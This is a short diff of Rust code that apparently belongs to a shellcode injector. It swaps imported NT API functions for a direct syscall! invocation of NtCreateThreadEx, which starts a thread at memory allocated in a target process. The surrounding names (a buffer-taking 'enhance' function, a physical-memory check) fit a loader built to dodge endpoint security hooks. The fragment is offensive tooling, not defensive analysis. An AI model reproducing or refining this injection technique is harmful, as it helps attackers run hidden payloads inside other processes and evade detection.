@@ -13,15 +13,13 @@ use winapi::{
         ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS}
     }
 };
+use ntapi::ntpsapi::PPS_ATTRIBUTE_LIST;
 use winapi::ctypes::c_void;
 use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
+use winapi::shared::ntdef::PVOID;
+use winapi::shared::ntdef::POBJECT_ATTRIBUTES;
 use std::{ptr::null_mut};
 use ntapi::ntapi_base::CLIENT_ID;
-use ntapi::ntpsapi::NtOpenProcess;
-use ntapi::ntmmapi::NtAllocateVirtualMemory;
-use ntapi::ntmmapi::NtWriteVirtualMemory;
-use ntapi::ntmmapi::NtProtectVirtualMemory;
-use ntapi::ntpsapi::NtCreateThreadEx;
 use winapi::um::sysinfoapi::GetPhysicallyInstalledSystemMemory;
 
 
@@ -94,7 +92,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
         */
         let mut thread_handle : *mut c_void = null_mut();
         let handle = process_handle as *mut c_void;
-        let write_thread = syscall!("NtCreateThreadEx", &mut thread_handle, GENERIC_ALL, null_mut(), handle, allocstart, null_mut(), 0, 0, 0, 0, null_mut());
+        let write_thread = syscall!("NtCreateThreadEx", &mut thread_handle, GENERIC_ALL, null_mut() as POBJECT_ATTRIBUTES, handle, allocstart, null_mut() as PVOID, 0, 0, 0, 0, null_mut() as PPS_ATTRIBUTE_LIST);
         //let write_thread = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, lol1, handle, allocstart, lol2, 0, 0, 0, 0, lol3);
 
         if !NT_SUCCESS(write_thread) {
